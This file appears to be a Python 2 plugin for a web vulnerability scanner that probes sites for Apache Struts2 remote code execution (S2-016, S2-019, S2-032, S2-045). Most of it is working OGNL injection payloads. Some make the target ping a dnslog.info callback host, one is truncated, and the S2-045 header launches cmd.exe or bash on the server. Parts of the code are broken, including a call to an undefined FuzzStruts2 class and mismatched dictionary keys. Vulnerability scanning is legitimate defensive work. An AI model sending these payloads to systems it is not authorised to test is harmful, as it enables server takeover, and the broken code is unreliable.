#!/usr/bin/env python
# coding=utf-8

"""
Struts2 -- 032
ping s2032.struts.99fd5e.dnslog.info
GET /?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=ping%20s2032.struts.99fd5e.dnslog.info&pp=%5CA&ppp=%20&encoding=UTF-8
Struts2 -- 019
ping s2019.struts.99fd5e.dnslog.info
/?debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'ping','s2019.struts.99fd5e.dnslog.info'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()
Struts2 -- 016
ping s2016.struts.99fd5e.dnslog.info
/index.action?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'ping','s2016.struts.99fd5e.dnslog.info'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D
Struts2 -- 013
ping s2013.struts.99fd5e.dnslog.info
/?a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('ping s2013.struts.99fd5e.dnslog.info').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}
Struts2 -- 009
ping s2009.struts.99fd5e.dnslog.info
/?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping s2009.struts.99fd5e.dnslog.info%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]
Struts2 -- 005
ping s2005.struts.99fd5e.dnslog.info
/?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75

"""


# 先默认传入的是URL，返回是(True, MSG)
import urlparse
import requests
from urllib import quote
from config import *


requests.packages.urllib3.disable_warnings()

def verify(task):
    """
    this function aim to detect the strusts vulnerability and it's history
    include 16,19,32,45
    :param: task, the proxy parsed the request item
    {
        "method": "GET/POST",
        "url" : "",
        "request_headers" : {},
    }
    :rtype: a tuple, if exists, return (True, message) else (Flase, {})
    """
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "struts rce",
        "info" : "[{}]",
    }

    # payload
    payload = {
        "S2-016" : "/index.action?redirect%3a%24%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d+%7b%27echo%27%2c%2735d33e01dfb4b2a2f72d66a413ea3d85%27%7d)).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader+(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23matt%3d+%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2c%23matt.getWriter().println+(%23e)%2c%23matt.getWriter().flush()%2c%23matt.getWriter().close()%7d",

        "S2-019" : "/index.action?debug%3dcommand%26expression%3d%23f%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23resp%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27echo%27%2c%2735d33e01dfb4b2a2f72d66a413ea3d85%27%7d)).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b10000%5d%2c%23d.read(%23e)%2c%23resp.println(%23e)%2c%23resp.close()",

        "S2-032" : "/index.action?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1%3f%23xx%3a%23request.toString%26cmd%3decho+35d33e01dfb4b2a2f72d66a413ea3d85%26pp%3d\A%26ppp%3d+%26encoding%3dUTF-8",
    }

    _ = urlparse.urlparse(task["url"])

    # 对payload请求完之后 单独处理s02-45, 如果s02-45出现，以这个为准
    url = _.scheme + "://" + _.netloc + "/index.action"
    headers2 = {}
    headers2['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) " \
                            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    cmd = 'echo 35d33e01dfb4b2a2f72d66a413ea3d85'

    #headers2['Content-Type'] = payload[type]
    headers2['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
        "(#_memberAccess?(#_memberAccess=#dm):" \
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
        "(#ognlUtil=#container.getInstance" \
        "(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
        "(#ognlUtil.getExcludedPackageNames().clear())." \
        "(#ognlUtil.getExcludedClasses().clear())." \
        "(#context.setMemberAccess(#dm))))." \
        "(#cmd='" + \
        cmd + \
        "')." \
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()." \
        "contains('win')))." \
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
        "(#p=new java.lang.ProcessBuilder(#cmds))." \
        "(#p.redirectErrorStream(true)).(#process=#p.start())." \
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." \
        "getOutputStream()))." \
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
        "(#ros.flush())}"
    # """
    data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
            'Content-Disposition: form-data; name="image1"\r\n' \
            'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
    found = False
    try:
        resp = requests.post(url, data, headers=headers2, timeout=(5, 15), verify=False)
        if "35d33e01dfb4b2a2f72d66a413ea3d85" in resp.content:
            message["param"] = "S2-045"
            message["url"] = url
            message["method"] = "POST"
            message["info"] = message["info"].format("struts2_045 payload came from lijiejie")
            found = True
    except Exception as e:
        # print str(e)
        logger.error(repr(e))



    # 如果s02-45未发现问题，那么进行下边的Fuzz
    if not found:
        for param in payload:
            url = _.scheme + "://" + _.netloc + payload[param]
            try:
                resp = requests.get(url, headers=task["request_header"], timeout=(5,10), verify=False)
                if "35d33e01dfb4b2a2f72d66a413ea3d85" in resp.content  and resp.status_code == 200:
                    message["param"] = param
                    message["url"] = url
                    found = True
                    break

            except Exception as e:
                logger.error(repr(e))

    if found:
        save_to_databases(message)
        return (True, message)
    else:
        return (False, {})






if __name__ == '__main__':
    item = {
        "url" : "",
        "method" : "GET",
        "request_header" : {},
        "request_content" :"",
    }

    a = FuzzStruts2(item)
    a.runFuzz()

